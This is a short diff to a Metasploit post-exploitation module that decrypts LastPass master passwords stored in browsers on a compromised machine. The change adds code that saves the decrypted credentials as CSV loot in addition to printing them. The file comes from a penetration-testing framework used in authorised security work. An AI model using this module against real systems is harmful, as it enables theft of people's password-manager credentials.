@@ -104,7 +104,17 @@ class Metasploit3 < Msf::Post
       password = clear_text_password(user, enc_pass)
       credentials_table << [account, browser, user, password]
     end
-    print_good credentials_table.to_s unless credentials.empty?
+    unless credentials.empty?
+      print_good credentials_table.to_s
+      path = store_loot(
+        "lastpass.creds",
+        "text/csv",
+        session,
+        credentials_table.to_csv,
+        nil,
+        "Decrypted LastPass Master Passwords"
+      )
+    end
   end
 
   # Returns a mapping of { Account => { Browser => paths } }
